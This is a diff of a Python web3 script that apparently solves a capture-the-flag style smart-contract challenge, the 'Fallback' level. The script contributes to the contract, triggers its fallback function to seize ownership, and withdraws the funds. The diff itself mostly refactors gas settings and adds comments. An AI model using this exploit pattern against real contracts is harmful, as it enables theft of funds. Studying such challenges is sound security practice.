@@ -45,31 +45,32 @@ def main():
     # 3. withdraw funds from the contract
     # 4. profit
 
-    fallback = read_contract_return_abi("./fallback.sol", contract_address, w3)
+    gas = 50_000
+    gas_price = w3.to_wei("5", "gwei")
 
-    contribute_gas_estimate = fallback.functions.contribute().estimate_gas()
+    fallback = read_contract_return_abi("./fallback.sol", contract_address, w3)
 
     contribute_tx_fields = {
         "value": 1,
-        "gas": int(contribute_gas_estimate*2),
-        "gasPrice": w3.to_wei("5", "gwei"),
+        "gas": gas,
+        "gasPrice": gas_price,
         "nonce": w3.eth.get_transaction_count(wallet_address)
     }
     contribute_tx = fallback.functions.contribute().build_transaction(contribute_tx_fields)
     contribute_tx_receipt = sign_and_send_transaction(w3, wallet_private_key, contribute_tx)
 
-    contribution = fallback .functions.contributions(wallet_address).call()
+    contribution = fallback.functions.contributions(wallet_address).call()
 
     if contribution > 0:
         print("Contributed successfully. Sending raw transaction...")
         print(f"Contribution: {contribution} wei")
 
         raw_tx_fields = {
-            "to": contract_address,
+            "to": contract_address, # we have to specify this because we didn't specify a contract function
             "value": 1, 
-            "data": "0x",
-            "gas": 40_000,
-            "gasPrice": w3.to_wei("5", "gwei"), 
+            "data": "0x", # specifying no calldata
+            "gas": gas,
+            "gasPrice": gas_price, 
             "nonce": w3.eth.get_transaction_count(wallet_address)
         }
 
@@ -78,8 +79,8 @@ def main():
         print("Attempting to withdraw funds...")
 
         withdrawal_tx_fields = {
-            "gas": 50_000,
-            "gasPrice": w3.to_wei("5", "gwei"),
+            "gas": gas,
+            "gasPrice": gas_price,
             "nonce": w3.eth.get_transaction_count(wallet_address)
         }
 
